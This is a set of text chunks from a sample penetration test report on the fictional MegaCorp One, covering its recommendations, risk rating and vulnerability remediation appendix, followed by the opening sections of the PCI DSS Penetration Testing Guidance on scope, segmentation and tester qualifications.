    "text": "to mitigate the impact of the discovered vulnerabilities. The specific goals of the penetration test were stated as: o Identifying if a remote attacker could penetrate MegaCorp One’s defenses o Determining the impact of a security breach on: o Confidentiality of the company’s information o Internal infrastructure and availability of MegaCorp One’s information systems These goals of the penetration test were met. A targeted attack against MegaCorp One can result in a complete compromise of organizational assets. Multiple issues that would typically be considered minor were leveraged in concert, resulting in a total compromise of the MegaCorp One’s information systems. It is important to note that this collapse of the entire MegaCorp One security infrastructure can be greatly attributed to insufficient access controls at both the network boundary and host levels. Appropriate efforts should be undertaken to introduce effective network segmentation, which could help mitigate the effect of cascading security failures throughout the MegaCorp One infrastructure. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 28 of 34\\nRecommendations Due to the impact to the overall organization as uncovered by this penetration test, appropriate resources should be allocated to ensure that remediation efforts are accomplished in a timely manner. While a comprehensive list of items that should be implemented is beyond the scope of this engagement, some high level items are important to mention. Offensive Security recommends the following: 1. Ensure that strong credentials are use everywhere in the organization. The compromise of MegaCorp One system as drastically impacted by the use of weak passwords as well as the reuse of passwords across systems of differing security levels. NIST SP 800-119 is recommended for guidelines on operating an enterprise password policy. While this issue was not widespread within MegaCorp One, it was still an issue and should be addressed. 2. Establish trust boundaries. Create logical boundaries of trust where appropriate on the internal network. Each logical trust segment should be able to be compromised without the breach easily cascading to other segments. This should include the use of unique administrative accounts so that a compromised system in one segment cannot be used in other locations. 3. Implement and enforce implementation of change control across all systems: Misconfiguration and insecure deployment issues were discovered across the various systems. The vulnerabilities that arose can be mitigated through the use of change control processes on all server systems. 4. Implement a patch management program: Operating a consistent patch management program per the guidelines outlined in NIST SP 800-4010 is an important component in maintaining good security posture. This will help to limit the attack surface that results from running unpatched internal services. 5. Conduct regular vulnerability assessments. As part of an effective organizational risk management strategy, vulnerability assessments should be conducted on a regular basis. Doing so will allow the organization to determine if the installed security controls are properly installed, operating as intended, and producing the desired outcome. Please consult NIST SP 800-3011 for guidelines on operating an effective risk",
    "metadata": {
      "doc_id": "Offensive Security - sample-penetration-testing-report",
      "chunk_id": 8
    }
  },
  {
    "text": "effective organizational risk management strategy, vulnerability assessments should be conducted on a regular basis. Doing so will allow the organization to determine if the installed security controls are properly installed, operating as intended, and producing the desired outcome. Please consult NIST SP 800-3011 for guidelines on operating an effective risk management program. 9 http://csrc.nist.gov/publications/drafts/800-118/draft-sp800-118.pdf 10 http://csrc.nist.gov/publications/nistpubs/800-40-Ver2/SP800-40v2.pdf 11 http://csrc.nist.gov/publications/PubsDrafts.html#SP-800-30-Rev.%201 PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 29 of 34\\nRisk Rating The overall risk identified to MegaCorp One as a result of the penetration test is High. A direct path from external attacker to full system compromise was discovered. It is reasonable to believe that a malicious entity would be able to successfully execute an attack against MegaCorp One through targeted attacks. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 30 of 34\\nAppendix A: Vulnerability Detail and Mitigation Risk Rating Scale In accordance with NIST SP 800-30, exploited vulnerabilities are ranked based upon likelihood and impact to determine overall risk. Default or Weak Credentials Rating: High Description: An externally exposed administrative interface is only protected with a weak password. Impact: Using common enumeration and brute-forcing techniques, it is possible to retrieve the administrative password for the SQLite Manager web interface. Due to the lack of any additional authentication mechanisms, it is also possible to retrieve all user password hashes in the underlying database. Successful retrieval of plaintext passwords could allow further compromise of the target environment if password reuse is found to exist. Remediation: Ensure that all administrative interfaces are protected with complex passwords or passphrases. Avoid use of common or business related words, which could be found or easily constructed with the help of a dictionary. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 31 of 34\\nPassword Reuse Rating: High Description: MegaCorp One user “mike” was found to be reusing credentials for the SQLite Manager application and his Windows domain access. Impact: Password reuse in general is a practice which should be highly discouraged and prevented to the extend possible. In this case, the impact of the vulnerability is amplified by the fact that an external attacker indirectly compromised a valid set of internal Windows domain credentials. This compromise potentially allows a substantial increase in the attack surface. Remediation: Update the password management policies to enforce the use of strong, unique, passwords for all disparate services. The use of password managers should be encouraged to more easily allow employees to utilize unique passwords across the various systems. Shared Local Administrator Password Rating: High Description: A number of MegaCorp One hosts are provisioned with the same local administrator password. Impact: MegaCorp One uses a Group Policy to set a local administrator password on all hosts within the scope of the GPO. Using the same local administrator password on corporate systems allows an attacker with appropriate access to utilize the well-known “pass-the-hash” attack vector. It allows an attacker to successfully authenticate on all hosts that share the same password, using",
    "metadata": {
      "doc_id": "Offensive Security - sample-penetration-testing-report",
      "chunk_id": 9
    }
  },
  {
    "text": "local administrator password on all hosts within the scope of the GPO. Using the same local administrator password on corporate systems allows an attacker with appropriate access to utilize the well-known “pass-the-hash” attack vector. It allows an attacker to successfully authenticate on all hosts that share the same password, using only the retrieved password hash. As such, the attack does not rely on successful decryption of the hash and it significantly increases the security breach footprint. Remediation: It is highly recommended to disable all local administrator accounts. In cases where a local administrative account is necessary, it should be assigned a unique name and a complex random password. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 32 of 34\\nPatch Management Rating: High Description: MegaCorp One’s external and internal environments contain a number of unpatched systems and application. Impact: A combination of weak authentication and unpatched hosts, which contain known vulnerabilities with publicly available exploits, allows an attacker to gain unauthorized access to a large number of MegaCorp One’s assets. Specifically, discovered instance of SQLite Manager is vulnerable to a remote code execution vulnerability and the underlying host also contains a local privilege escalation vulnerability, which can easily be leveraged to compromise the externally exposed host entirely. This appears to be an indication of an insufficient patch management policy and its implementation. Remediation: All corporate assets should be kept current with latest vendor-supplied security patches. This can be achieved with vendor-native tools or third-party applications, which can provide an overview of all missing patches. In many instances, third-party tools can also be used for patch deployment throughout a heterogeneous environment. DNS Zone Transfer Rating: Low Description: A misconfigured DNS server allows unrestricted zone transfers. Impact: A DNS server, which is configured to allow zone transfers to any DNS server, can provide sensitive information about corporate assets and network layouts. Remediation: DNS zone transfers should be restricted only to pre-approved servers. Default Apache Files Rating: Low Description: Default Apache files were discovered on the admin.megacorpone.com host. Impact: An attacker may be able to guess the exact version of the running Apache server by inspecting the contents of the default files. Additional sensitive information may also be available. Remediation: Remove all default files from publicly accessible web servers. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 33 of 34\\nAppendix B: About Offensive Security Offensive Security advocates penetration testing for impact as opposed to penetration testing for coverage. Penetration testing for coverage has risen in popularity in recent years as a simplified method of assessments used in situations where the goal is to meet regulatory needs. As a form of vulnerability scanning, penetration testing for coverage includes selective verification of discovered issues through exploitation. This allows service providers the ability to conduct the work largely through the use of automated toolsets and maintain consistency of product across multiple engagements. Penetration testing for impact is a form of attack simulation under controlled conditions, which closely mimics the",
    "metadata": {
      "doc_id": "Offensive Security - sample-penetration-testing-report",
      "chunk_id": 10
    }
  },
  {
    "text": "includes selective verification of discovered issues through exploitation. This allows service providers the ability to conduct the work largely through the use of automated toolsets and maintain consistency of product across multiple engagements. Penetration testing for impact is a form of attack simulation under controlled conditions, which closely mimics the real world, targeted attacks that organizations face on a day-to-day basis. Penetration testing for impact is a goal-based assessment, which creates more than a simple vulnerability inventory, instead providing the true business impact of a breach. An impact-based penetration test identifies areas for improvement that will result in the highest rate of return for the business. Penetration testing for impact poses the challenge of requiring a high skillset to successfully complete. As demonstrated in this sample report, Offensive Security believes that it is uniquely qualified to deliver world-class results when conducting penetration tests for impact, due to the level of expertise found within our team of security professionals. Offensive Security does not maintain a separate team for penetration testing and other activities that the company is engaged in. This means that the same individuals that are involved in Offensive Security’s industry leading performance-based training, the production of industry standard tools such as Kali Linux, authors of best selling books, creators of 0-day exploits, and maintainers of industry references such as Exploit-DB are the same individuals that are involved in the delivery of services. Offensive Security offers a product that cannot be matched in the market. However, we may not be the right fit for every job. Offensive Security typically conducts consulting services with a low volume, high skill ratio to allow Offensive Security staff to more closely mimic real world situations. This also allows customers to have increased access to industry-recognized expertise all while keeping costs reasonable. As such, high volume/fast turn-around engagements are often not a good fit for our services. Offensive Security is focused on conducting high quality, high impact assessments and is actively sought out by customers in need of services that cannot be delivered by other vendors. If you would like to discuss your penetration testing needs, please contact us at info@offsec.com. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 34 of 34",
    "metadata": {
      "doc_id": "Offensive Security - sample-penetration-testing-report",
      "chunk_id": 11
    }
  },
  {
    "text": "Standard: PCI Data Security Standard (PCI DSS) Version: 1.1 Date: September 2017 Author: Penetration Test Guidance Special Interest Group PCI Security Standards Council Information Supplement: Penetration Testing Guidance\\nDocument Changes Date Document Description Pages Version March 2015 1.0 Initial release All September 2017 1.1 A number of clarifications, including: Various • Clarified intent of “social engineering” in Terminology. • Clarified guidance on black-box testing. • Restructured Section 2.2 for better flow, and clarified language describing intent of PCI DSS Requirement 11.3. • Expanded guidance related to back-end APIs. • Updated references to PCI SSC resources. • Minor grammatical updates. The intent of this document is to provide supplemental information. Information provided here does not i\\nTable of Contents 1 Introduction ........................................................................................................................................................ 4 1.1 Objective ....................................................................................................................................................... 4 1.2 Intended Audience ........................................................................................................................................ 4 1.3 Terminology................................................................................................................................................... 4 1.4 Navigating this Document ............................................................................................................................. 5 2 Penetration Testing Components .................................................................................................................... 6 2.1 How does a penetration test differ from a vulnerability scan? ...................................................................... 6 2.2 Scope ............................................................................................................................................................ 7 2.2.1 External Penetration Test ....................................................................................................................... 8 2.2.2 Internal Penetration Test ........................................................................................................................ 8 2.2.3 Testing Segmentation Controls .............................................................................................................. 8 2.2.4 Critical Systems ...................................................................................................................................... 9 2.3 Application-Layer and Network-Layer Testing .............................................................................................. 9 2.3.1 Authentication ......................................................................................................................................... 9 2.3.2 PA-DSS Compliant Applications ............................................................................................................ 9 2.3.3 Web Applications .................................................................................................................................. 10 2.3.4 Separate Testing Environment ............................................................................................................. 10 2.4 Segmentation Checks ................................................................................................................................. 10 2.5 Social Engineering ...................................................................................................................................... 11 2.6 What is considered a “significant change”? ................................................................................................ 11 3 Qualifications of a Penetration Tester ........................................................................................................... 12 3.1 Certifications................................................................................................................................................ 12 3.2 Past Experience .......................................................................................................................................... 12 4 Methodology ..................................................................................................................................................... 14 4.1 Pre-Engagement ......................................................................................................................................... 14 4.1.1 Scoping ................................................................................................................................................. 14 4.1.2 Documentation ..................................................................................................................................... 14 4.1.3 Rules of Engagement ........................................................................................................................... 15 4.1.4 Third-Party-Hosted / Cloud Environments ............................................................................................ 16 4.1.5 Success Criteria ................................................................................................................................... 16 4.1.6 Review of Past Threats and Vulnerabilities .......................................................................................... 16 4.1.7 Avoid scan interference on security appliances. .................................................................................. 17 4.2 Engagement: Penetration Testing............................................................................................................... 17 4.2.1 Application Layer .................................................................................................................................. 18 4.2.2 Network Layer....................................................................................................................................... 18 4.2.3 Segmentation ....................................................................................................................................... 19 4.2.4 What to do when cardholder data is encountered ................................................................................ 19 The intent of this document is to provide supplemental information. Information provided here does not ii\\n4.2.5 Post-Exploitation ................................................................................................................................... 19 4.3 Post-Engagement ....................................................................................................................................... 19 4.3.1 Remediation Best Practices ................................................................................................................. 19 4.3.2 Retesting Identified Vulnerabilities ....................................................................................................... 20 4.3.3 Cleaning up the Environment ............................................................................................................... 20 4.4 Additional Resources .................................................................................................................................. 20 5 Reporting and Documentation ........................................................................................................................ 21 5.1 Identified Vulnerability Reporting ................................................................................................................ 21 5.1.1 Assigning a Severity Score................................................................................................................... 21 5.1.2 Industry Standard References .............................................................................................................. 22 5.2 Reporting Guidelines ................................................................................................................................... 22 5.2.1 Penetration Test Report Outline ........................................................................................................... 22 5.2.2 Retesting Considerations and Report Outline ...................................................................................... 23 5.3 Evidence retention ...................................................................................................................................... 24 5.3.1 What is considered evidence? ............................................................................................................. 24 5.3.2 Retention .............................................................................................................................................. 24 5.4 Penetration Test Report Evaluation Tool .................................................................................................... 25 6 Case Studies / Scoping Examples ................................................................................................................. 27 6.1 E-commerce Penetration Test Case Study ................................................................................................. 27 6.2 Hosting Provider Penetration Test Case Study .......................................................................................... 30 6.3 Retail Merchant Penetration Test Case Study ............................................................................................ 35 Appendix A: Quick-Reference Table to Guidance on PCI DSS Penetration Testing Requirements ............. 40 Acknowledgements ............................................................................................................................................... 41 About the PCI Security Standards Council",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 0
    }
  },
  {
    "text": "27 6.1 E-commerce Penetration Test Case Study ................................................................................................. 27 6.2 Hosting Provider Penetration Test Case Study .......................................................................................... 30 6.3 Retail Merchant Penetration Test Case Study ............................................................................................ 35 Appendix A: Quick-Reference Table to Guidance on PCI DSS Penetration Testing Requirements ............. 40 Acknowledgements ............................................................................................................................................... 41 About the PCI Security Standards Council ......................................................................................................... 43 The intent of this document is to provide supplemental information. Information provided here does not iii\\n1 Introduction 1.1 Objective This information supplement provides general guidance and guidelines for penetration testing. The guidance focuses on the following:  Penetration Testing Components: Understanding of the different components that make up a penetration test and how this differs from a vulnerability scan including scope, application and network-layer testing, segmentation checks, and social engineering.  Qualifications of a Penetration Tester: Determining the qualifications of a penetration tester, whether internal or external, through their past experience and certifications.  Penetration Testing Methodologies: Detailed information related to the three primary parts of a penetration test: pre-engagement, engagement, and post-engagement.  Penetration Testing Reporting Guidelines: Guidance for developing a comprehensive penetration test report that includes the necessary information to document the test as well as a checklist that can be used by the organization or the assessor to verify whether the necessary content is included. The information in this document is intended as supplemental guidance and does not supersede, replace, or extend PCI DSS requirements. The current version of PCI DSS at the time of publication is v3.2; however, the general principles and practices offered here may also be applicable to other versions of PCI DSS. 1.2 Intended Audience This guidance is intended for entities that are required to conduct a penetration test whether they use an internal or external resource. In addition, this document is intended for companies that specialize in offering penetration test services, and for assessors who help scope penetration tests and review final test reports. The guidance is applicable to organizations of all sizes, budgets, and industries. 1.3 Terminology The following terms are used throughout this document:  Application-layer testing: Testing that typically includes websites, web applications, thick clients, or other applications.  Black-box testing: Testing performed without prior knowledge of the internal structure/design/implementation of the object being tested.  Common Vulnerability Scoring System (CVSS): Provides an open framework for communicating the characteristics and impacts of IT vulnerabilities.  Grey-box testing: Testing performed with partial knowledge of the internal structure/design/implementation of the object being tested. The intent of this document is to provide supplemental information. Information provided here does not 4\\n National Vulnerability Database (NVD): The U.S. government repository of standards based vulnerability management data. This data enables automation of vulnerability management, security measurement, and compliance (e.g., FISMA).  Network-layer testing: Testing that typically includes external/internal testing of networks (LANS/VLANS), between interconnected systems, and wireless networks.  Penetration tester, tester, or team: The individual(s) conducting the penetration test for the entity. They may be a resource internal or external to the entity.  Social engineering: Manipulation or deception of individuals into",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 1
    }
  },
  {
    "text": "Testing that typically includes external/internal testing of networks (LANS/VLANS), between interconnected systems, and wireless networks.  Penetration tester, tester, or team: The individual(s) conducting the penetration test for the entity. They may be a resource internal or external to the entity.  Social engineering: Manipulation or deception of individuals into divulging confidential or personal information.  White-box testing: Testing performed with knowledge of the internal structure/design/implementation of the object being tested. 1.4 Navigating this Document This document is organized in such a way to help the reader better understand penetration testing in a holistic sense. It begins by providing background and definitions for topics common to all penetration test efforts (including scoping the test, critical systems to test, application and network-layer test inclusions, etc.). The document then moves on to practical guidance on selecting a penetration tester, methodologies that are used before, during, and after a test, guidelines for reporting and evaluating test results. The document concludes with case studies that attempt to illustrate the concepts presented in this supplement. Appendix A provides a quick-reference table to specific sections of this document where guidance on a particular PCI DSS requirement can be found. This may be useful for those wishing to quickly correlate the penetration testing requirements and guidelines presented in PCI DSS Requirement 11.3. The intent of this document is to provide supplemental information. Information provided here does not 5\\n2 Penetration Testing Components The goals of penetration testing are: 1. To determine whether and how a malicious user can gain unauthorized access to assets that affect the fundamental security of the system, files, logs and/or cardholder data. 2. To confirm that the applicable controls required by PCI DSS—such as scope, vulnerability management, methodology, and segmentation—are in place. There are three types of penetration tests: black-box, white-box, and grey-box. In a black-box assessment, the client provides no information prior to the start of testing. In a white-box assessment, the entity may provide the penetration tester with full and complete details of the network and applications. For grey-box assessments, the entity may provide partial details of the target systems. PCI DSS penetration tests are typically performed as either white-box or grey-box assessments. These types of assessments yield more accurate results and provide a more comprehensive test of the security posture of the environment than a pure black-box assessment. Performing a black-box assessment, when the entity provides no details of the target systems prior to the start of the test, may require more time, money, and resources for the deliverables to meet the requirements of PCI DSS. 2.1 How does a penetration test differ from a vulnerability scan? The differences between penetration testing and vulnerability scanning, as required by PCI DSS, can be summarized as follows: Vulnerability Scan Penetration Test Purpose Identify, rank, and report vulnerabilities that, if Identify ways to exploit vulnerabilities to exploited, may result in an intentional or circumvent or defeat the security features of unintentional compromise of a system. system components. When At least quarterly and after significant",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 2
    }
  },
  {
    "text": "be summarized as follows: Vulnerability Scan Penetration Test Purpose Identify, rank, and report vulnerabilities that, if Identify ways to exploit vulnerabilities to exploited, may result in an intentional or circumvent or defeat the security features of unintentional compromise of a system. system components. When At least quarterly and after significant changes1. At least annually and upon significant changes2. How Typically a variety of automated tools combined A manual process that may include the use of with manual verification of identified issues. vulnerability scanning or other automated tools, resulting in a comprehensive report. 1 Refer to Section 2.6 of this document for guidance on significant changes. 2 Some entities may be required to perform penetration tests more frequently. Refer to the current version of PCI DSS to understand specific requirements. The intent of this document is to provide supplemental information. Information provided here does not 6\\nVulnerability Scan Penetration Test Reports Potential risks posed by known vulnerabilities, Description of each vulnerability verified and/or ranked in accordance with NVD/CVSS base potential issue discovered. More specific risks scores associated with each vulnerability. that vulnerability may pose, including specific methods how and to what extent it may be For PCI DSS, external vulnerability scans must exploited. Examples of vulnerabilities include but be performed by an ASV and the risks ranked in are not limited to SQL injection, privilege accordance with the CVSS. Internal vulnerability escalation, cross-site scripting, or deprecated scans may be performed by qualified personnel protocols. (does not require an ASV) and risks ranked in accordance with the organization’s risk-ranking process as defined in PCI DSS Requirement 6.1. An external vulnerability scan is conducted from outside the target organization. An internal vulnerability scan is conducted from inside the target organization. Duration Relatively short amount of time, typically several Engagements may last days or weeks seconds to several minutes per scanned host. depending on the scope of the test and size of the environment to be tested. Tests may grow in time and complexity if efforts uncover additional scope. 2.2 Scope PCI DSS defines the cardholder data environment (CDE) as “the people, processes, and technology that store, process, or transmit cardholder data or sensitive authentication data.” The scope of a penetration test, as defined in PCI DSS Requirement 11.3, includes the entire CDE perimeter and any critical systems. This applies both to the external perimeter (public-facing attack surfaces) and the internal perimeter of the CDE (LAN-LAN attack surfaces). The scope of testing may include locations of cardholder data, applications that store, process, or transmit cardholder data, critical network connections, access points, and other targets appropriate for the complexity and size of the organization. This should include resources and assets utilized by personnel to maintain systems in the CDE or to access cardholder data, as the compromise of such assets could allow an attacker to obtain credentials with access to or a route into the CDE. All penetration testing should only be conducted as defined by the rules of engagement agreed upon by both parties. See",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 3
    }
  },
  {
    "text": "in the CDE or to access cardholder data, as the compromise of such assets could allow an attacker to obtain credentials with access to or a route into the CDE. All penetration testing should only be conducted as defined by the rules of engagement agreed upon by both parties. See Section 4.1.3, “Rules of Engagement.” The intent of this document is to provide supplemental information. Information provided here does not 7\\n2.2.1 External Penetration Test The scope of an external penetration test is the exposed external perimeter of the CDE and critical systems connected or accessible to public network infrastructures. It should assess any unique access to the scope from the public networks, including services that have access restricted to individual external IP addresses. Testing must include both application-layer and network-layer assessments. External penetration tests also include remote access vectors such as dial-up and VPN connections. 2.2.2 Internal Penetration Test The scope of the internal penetration test is the internal perimeter of the CDE and critical systems from the perspective of the internal network. Testing must include both application-layer and network-layer assessments. Where the CDE is also the only internal network and there is no internal CDE perimeter, the scope of testing will typically be focused on critical systems. For example, testing activities may include attempting to bypass internal access controls intended to prevent unauthorized access or use of systems that store, process, or transmit CHD from those that do not. In cases where there is an internal CDE perimeter, the scope of testing will need to consider the CDE perimeter as well as critical systems within and outside of the CDE. For example, the testing may attempt to exploit permitted access paths from systems on an internal network segment into the CDE. When access to the CDE is obtained as a result of the testing, the scope of the penetration test may allow the tester to continue exploring inside the network and further the attack against other systems within the CDE, and may also include testing any data-exfiltration prevention (data-loss prevention) controls that are in place. In all cases, the scope of internal testing should consider the specific environment and the entity’s risk assessment. Entities are encouraged to consult with their assessor and the penetration tester to ensure the scope of the penetration test is sufficient and appropriate for their particular environment. 2.2.3 Testing Segmentation Controls The intent of segmentation is to prevent out-of-scope systems from being able to communicate with systems in the CDE or impact the security of the CDE. When properly implemented, a segmented (out-of- scope) system component could not impact the security of the CDE, even if an attacker obtained control of the out-of-scope system. If segmentation controls are implemented, testing of the controls is required to confirm that the segmentation methods are working as intended and that all out-of-scope systems and networks are isolated from systems in the CDE. The scope of segmentation testing should consider any networks and systems considered as being out of",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 4
    }
  },
  {
    "text": "segmentation controls are implemented, testing of the controls is required to confirm that the segmentation methods are working as intended and that all out-of-scope systems and networks are isolated from systems in the CDE. The scope of segmentation testing should consider any networks and systems considered as being out of scope for PCI DSS to verify they do not have connectivity to the CDE and cannot be used to impact the security of the CDE. The intent of this assessment is to validate the effectiveness of the segmentation controls separating the out-of-scope environments from the CDE and to ensure the controls are operating as intended. The intent of this document is to provide supplemental information. Information provided here does not 8\\n2.2.4 Critical Systems The term “critical systems” is used in PCI DSS to reference systems that are involved in the processing or protection of cardholder data. PCI DSS provides examples of critical systems that may be impacted by identified vulnerabilities including “security systems, public-facing devices and systems, databases, and other systems that store, process, or transmit cardholder data” (Requirement 6.1). However, for the purposes of a penetration test, there may be additional systems outside the CDE boundaries that could affect the security of the CDE. These systems should also be considered to be critical systems. Common examples of critical systems relevant to a penetration test might include: security systems (for example, firewalls, intrusion-detection systems/intrusion-prevention systems (IDS/IPS), authentication servers, e- commerce redirection servers, etc.), or any assets utilized by privileged users to support and manage the CDE. Please note that critical systems are defined by the entity, as each environment is different. 2.3 Application-Layer and Network-Layer Testing Any software written by or specifically for the organization that is part of the penetration test scope should be subject to both an application and network-layer penetration test. This assessment helps identify security defects that result from either insecure application design or configuration, or from employing insecure coding practices or security defects that may result from insecure implementation, configuration, usage, or maintenance of software. The remediation of vulnerabilities identified during an application-layer assessment may involve redesigning or rewriting insecure code. The remediation of vulnerabilities identified during a network-layer assessment typically involves either reconfiguring or updating software. In some instances, remediation may include deploying a secure alternative to insecure software. 2.3.1 Authentication If the application requires user authentication to the custom software, testing should be performed against all roles or types of access assumed by these parties. Also, testing should be performed against any role or access type that does not have explicit authorization to cardholder data to verify accounts without access cannot compromise such data. For customers running applications on multitenant servers that provide customers access to their cardholder data, authenticated testing should be performed to ensure customer access is properly restricted to only their own cardholder data. The customer should provide the penetration tester with credentials that have equivalent permission(s) as a customer user, to allow the penetration tester to determine whether those",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 5
    }
  },
  {
    "text": "customers access to their cardholder data, authenticated testing should be performed to ensure customer access is properly restricted to only their own cardholder data. The customer should provide the penetration tester with credentials that have equivalent permission(s) as a customer user, to allow the penetration tester to determine whether those credentials allow access to data beyond the entity’s data. 2.3.2 PA-DSS Compliant Applications If a payment application has been PA-DSS validated, the application’s functionality does not need to be tested as part of the entity’s PCI DSS compliance validation. However, the implementation of the application does need to be tested. This includes both the operating system and any exposed services, but not the payment application’s functionality (e.g., authentication, key management, transaction processing, etc.) since this was validated as part of the PA-DSS application validation. The intent of this document is to provide supplemental information. Information provided here does not 9\\n2.3.3 Web Applications It is common for an environment to host a web application that was not specifically coded for the organization such as commercial, off-the-shelf web-mail interfaces, document-sharing tools, file-transfer services, network-device administrative interfaces, etc. In these instances, the web application does not typically need an application-layer penetration test as the entity is not responsible for the source code of this type of software. Instead, the tester should perform a network-layer test and ensure the software was implemented, configured, and is currently being maintained in a secure manner (disabling or uninstalling unused services, blocking unused ports, applying current updates, etc.). 2.3.4 Separate Testing Environment Because of the nature and the intent of penetration testing, such testing in a production environment during normal business hours may impact business operations, and attempts to avoid disruption may increase the time, resources and complexity of the testing. This is especially important for high availability systems that may be impacted by penetration testing in a production environment. To avoid disruptions and to speed up testing, a separate environment that is identical to the production environment may be used for testing instead of the production environment. The penetration tester would need to ensure the same application and network-layer controls as production exist in the testing environment. This may be accomplished through methods to map out the production environment to verify it matches the testing environment. This should be included in the rules of engagement. All exploitable vulnerabilities identified during the testing must be corrected on production systems and testing repeated to verify that security weaknesses have been addressed. 2.4 Segmentation Checks PCI DSS Requirement 11.3.4 requires penetration testing to validate that segmentation controls and methods are operational, effective, and isolate all out-of-scope systems from systems in the CDE. Therefore, a robust approach to penetration testing is recommended to satisfy this requirement by actively attempting to identify routes and paths from networks outside the CDE into the CDE. All segmentation methods need to be specifically tested. In very large networks, with numerous internal LAN segments, it may be infeasible for the penetration tester to conduct specific tests",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 6
    }
  },
  {
    "text": "recommended to satisfy this requirement by actively attempting to identify routes and paths from networks outside the CDE into the CDE. All segmentation methods need to be specifically tested. In very large networks, with numerous internal LAN segments, it may be infeasible for the penetration tester to conduct specific tests from every individual LAN segment. In this case, the testing needs to be planned to examine each type of segmentation methodology in use (i.e., firewall, VLAN ACL, etc.) in order to validate the effectiveness of the segmentation controls. The level of testing for each segmentation methodology should provide assurance that the methodology is effective in all instances of use. In order to effectively validate the segmentation methodologies, it is expected that the penetration tester has worked with the organization (or the organization’s QSA) to clearly understand all methodologies in use in order to provide complete coverage when testing. The penetration tester may choose to include systems located in these isolated LAN segments not directly related to the processing, transmission, or storage of cardholder data to ensure these systems could not impact the security of the CDE if compromised. See Section 4.2.3 for specific guidance on testing methodologies for validating segmentation controls. The intent of this document is to provide supplemental information. Information provided here does not 10\\n2.5 Social Engineering Social engineering is the attempt to gain information, access, or introduce unauthorized software into the environment through the manipulation of end users. PCI DSS reconfirms testing by requiring industry accepted penetration-testing approaches (many of which include social engineering as part of their approach) and to have an approach to penetration testing that \"considers the threats and vulnerabilities experienced by merchants in the last 12 months.\" This may include social-engineering attacks as a method used for introducing malware into the environment. Social-engineering tests are an effective method of identifying risks associated with end users’ failure to follow documented policies and procedures. There is no blanket approach to social-engineering engagements. If an organization chooses to include social-engineering testing as part of its annual security review, the tests performed should be appropriate for the size and complexity of the organization and should consider the maturity of the organization’s security awareness program. These tests might include in-person, non- technological interactions such as persuading someone to hold open a door, remote interactions such as having someone provide or reset a password, or convincing the end user to open a vulnerable e-mail attachment or hyperlink. While PCI DSS does not require testing to include social-engineering techniques, an entity can incorporate it into its penetration testing methodology as an ongoing method to determine the effectiveness of the security awareness program. The frequency of social-engineering tests would be determined by the entity when establishing its security awareness program. End-user security awareness re-education might be sufficient remediation for users who fail a social-engineering test. The objective is that, over time, fewer and fewer employees are making poor decisions that could allow an attacker to compromise security. Additional guidance on establishing",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 7
    }
  },
  {
    "text": "by the entity when establishing its security awareness program. End-user security awareness re-education might be sufficient remediation for users who fail a social-engineering test. The objective is that, over time, fewer and fewer employees are making poor decisions that could allow an attacker to compromise security. Additional guidance on establishing an effective and robust security awareness program can be found in the Document Library on the PCI SSC website. Social-engineering testing may not be appropriate or provide a meaningful result for all organizations. Although social-engineering testing is not a requirement of PCI DSS, an organization may consider documenting the reason(s) for foregoing social-engineering testing and include applicable documentation with the internal and external penetration test reports, particularly if social-engineering attacks were encountered in the last 12 months. 2.6 What is considered a “significant change”? Per PCI DSS Requirements 11.3.1 and 11.3.2, penetration testing must be performed at least annually and after any significant change—for example, infrastructure or application upgrade or modification—or new system component installations. What is deemed “significant” is highly dependent an entity’s risk- assessment process and on the configuration of a given environment. Because of this variability, a significant change is not prescribed by PCI DSS. If the change could impact the security of the network or allow access to cardholder data, it may be considered significant by the entity. Penetration testing of significant changes is performed to ensure that controls assumed to be in place are still working effectively after the upgrade or modification. The intent of this document is to provide supplemental information. Information provided here does not 11\\n3 Qualifications of a Penetration Tester Qualified internal resources or a qualified third party may perform the penetration test as long as they are organizationally independent. This means the penetration tester must be organizationally separate from the management of the target systems. For example, in situations where a third-party company is performing the PCI DSS assessment for the entity, that party cannot perform the penetration test if they were involved in the installation, maintenance, or support of target systems. The following guidelines may be useful when selecting a penetration tester (or team) to understand their qualifications to perform penetration testing. 3.1 Certifications Certifications held by a penetration tester may be an indication of the skill level and competence of a potential penetration tester or company. While these are not required certifications, they can indicate a common body of knowledge held by the candidate. The following are some examples of common penetration testing certifications:  Offensive Security Certified Professional (OSCP)  Certified Ethical Hacker (CEH)  Global Information Assurance Certification (GIAC) Certifications (e.g., GIAC Certified Penetration Tester (GPEN), GIAC Web Application Penetration Tester (GWAPT), or GIAC Exploit Researcher and Advanced Penetration Tester (GXPN))  CREST Penetration Testing Certifications  Communication Electronic Security Group (CESG) IT Health Check Service (CHECK) certification Note: The PCI SSC does not validate or endorse these certifications. 3.2 Past Experience Appropriate penetration testing experience and qualifications cannot be met by certifications alone. Therefore, confirmation of",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 8
    }
  },
  {
